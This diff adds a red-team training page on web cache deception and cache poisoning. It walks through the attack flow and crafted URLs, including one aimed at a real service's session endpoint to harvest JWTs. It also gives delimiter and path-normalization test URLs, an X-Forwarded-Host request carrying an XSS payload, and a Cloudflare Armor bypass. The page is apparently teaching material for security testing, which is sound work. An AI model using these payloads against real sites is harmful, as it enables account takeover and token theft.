@@ -1,0 +1,152 @@
+---
+layout: training-page
+title: "Web Cache Deception — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - web-cache-deception
+  - cache-poisoning
+  - account-takeover
+  - cdn
+page_key: "web-cache-deception-attacks"
+---
+<h1>Web Cache Deception</h1>
+<p>
+  Web Cache Deception (WCD) is an attack where an adversary tricks a caching layer (CDN, reverse
+  proxy, or edge cache) into storing a sensitive, authenticated response as a publicly accessible
+  cached asset. Once cached, any user — including the unauthenticated attacker — can retrieve the
+  victim's private page content.
+</p>
+<p>
+  The root cause is a discrepancy between how the origin server and the caching layer interpret
+  URLs: the origin serves dynamic content based on the authenticated session, while the cache
+  sees a static file extension and stores the response permanently.
+</p>
+
+<h2>Tools</h2>
+<ul>
+  <li>PortSwigger/param-miner Burp Extension — finds unkeyed cache inputs — <code>github.com/PortSwigger/param-miner</code></li>
+</ul>
+
+<h2>Core Attack Flow</h2>
+<p>
+  Example scenario: victim is logged into <code>example.com</code>. Attacker tricks them into
+  visiting <code>https://www.example.com/myaccount/home/malicious.css</code>.
+</p>
+<ol>
+  <li>Victim's browser requests <code>/myaccount/home/malicious.css</code></li>
+  <li>Cache server misses — no cached entry yet</li>
+  <li>Request forwarded to origin server</li>
+  <li>Origin server ignores the <code>/malicious.css</code> suffix and returns the <code>/myaccount/home/</code> page (with session data) and cache-control headers saying "do not cache"</li>
+  <li>Response passes through the caching layer</li>
+  <li>Cache sees the <code>.css</code> extension, overrides the cache-control directive, and caches the response as a CSS asset</li>
+  <li>Attacker (unauthenticated) requests <code>/myaccount/home/malicious.css</code> and receives the victim's authenticated page from cache</li>
+</ol>
+
+<h2>Exploitation Examples</h2>
+
+<h3>PayPal Home Page (Historical)</h3>
+<pre><code># Normal authenticated browse
+https://www.example.com/myaccount/home/
+
+# Attacker crafts and distributes this link:
+https://www.example.com/myaccount/home/malicious.css
+
+# Victim visits the link while authenticated
+# Cache stores their account page as "malicious.css"
+
+# Attacker retrieves cached victim data (unauthenticated)
+curl https://www.example.com/myaccount/home/malicious.css</code></pre>
+
+<h3>OpenAI JWT Credential Theft</h3>
+<pre><code># Target: /api/auth/session returns JWT for authenticated users
+# Attacker crafts a .css path:
+https://chat.openai.com/api/auth/session/session.css
+
+# Distributes link to victims
+# Response is cached — contains bearer JWT
+# Attacker harvests tokens from cache</code></pre>
+
+<h2>Detection Techniques</h2>
+
+<h3>Delimiter Discrepancy Testing</h3>
+<p>
+  Some origin servers use delimiters like <code>;</code> to separate the real path from
+  extra path components, while the caching layer does not understand the delimiter and treats the
+  full string as a path to a static file.
+</p>
+<pre><code># Semicolon delimiter (common in Java/Spring apps):
+https://example.com/settings/profile;script.js
+
+# Origin interprets: /settings/profile
+# Cache interprets:  /settings/profile;script.js (sees .js, caches it)
+
+# Slash variations:
+https://example.com/app/conversation/.js?test
+https://example.com/app/conversation/;.js
+https://example.com/home.php/non-existent.css</code></pre>
+
+<h3>Path Normalization Testing</h3>
+<pre><code># Origin resolves path traversal; cache does not:
+https://example.com/wcd/..%2fprofile
+
+# Cache stores: /wcd/..%2fprofile (treated as a path with .css or static-like extension)
+# Origin resolves: /profile (returns authenticated profile data)</code></pre>
+
+<h2>Cache Poisoning via Unkeyed Headers</h2>
+<p>
+  A related technique: inject attacker-controlled values via headers that are not included in the
+  cache key. If the application reflects the header value in the response, the poisoned response
+  gets cached and served to all subsequent visitors.
+</p>
+<pre><code># Common unkeyed inputs:
+User-Agent
+Cookie
+X-Forwarded-Host
+X-Host
+X-Forwarded-Server
+X-Forwarded-Scheme
+X-Original-URL  (Symfony)
+X-Rewrite-URL   (Symfony)</code></pre>
+
+<pre><code># Example: X-Forwarded-Host injection (cache buster keeps this from poisoning the homepage)
+GET /test?buster=123 HTTP/1.1
+Host: target.com
+X-Forwarded-Host: test"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+# If the app reflects X-Forwarded-Host in an og:image meta tag:
+HTTP/1.1 200 OK
+Cache-Control: public, no-cache
+...
+&lt;meta property="og:image" content="https://test"&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
+
+# This response gets cached — XSS payload served to all users who visit /test</code></pre>
+
+<h2>CloudFlare Specifics</h2>
+<p>
+  CloudFlare CDN caches resources with <code>Cache-Control: public, max-age &gt; 0</code>.
+  It does not cache HTML by default, but caches based on file extension, not MIME type.
+  Extensions that trigger caching include:
+</p>
+<pre><code>7Z  CSV  GIF  MIDI  PNG  TIF  ZIP  AVI  DOC  GZ   MKV  PPT  TIFF  ZST
+CSS JS   ICO  MP3   MP4  PDF  SVG  WOFF WOFF2 TTF  OTF  BMP  JPG  JPEG
+EXE JAR  APK  DMG   ISO  BIN  EJS  EOT  EPS   FLAC MID  PLS  TAR  XLSX</code></pre>
+
+<h3>CloudFlare Cache Deception Armor</h3>
+<p>
+  When enabled, the Cache Deception Armor rule verifies that the URL extension matches the returned
+  Content-Type. It is <strong>not enabled by default</strong>. Bypasses were found using
+  <code>.avif</code> extension (HackerOne #1391635, now fixed).
+</p>
+<pre><code># Bypass: .avif extension was not in the default deny list
+https://example.com/myaccount/home/x.avif</code></pre>
+
+<h2>Resources</h2>
+<ul>
+  <li>PayloadsAllTheThings Web Cache Deception — <code>github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception</code></li>
+  <li>Web Cache Deception Attack — Omer Gil, 2017 — original research</li>
+  <li>Practical Web Cache Poisoning — James Kettle, PortSwigger</li>
+  <li>Web Cache Entanglement — James Kettle, PortSwigger</li>
+  <li>OpenAI Account Takeover via WCD — Nagli, March 2023</li>
+  <li>PortSwigger Labs — Web Cache Poisoning — <code>portswigger.net/web-security/all-labs#web-cache-poisoning</code></li>
+  <li>param-miner Burp extension — <code>github.com/PortSwigger/param-miner</code></li>
+</ul>
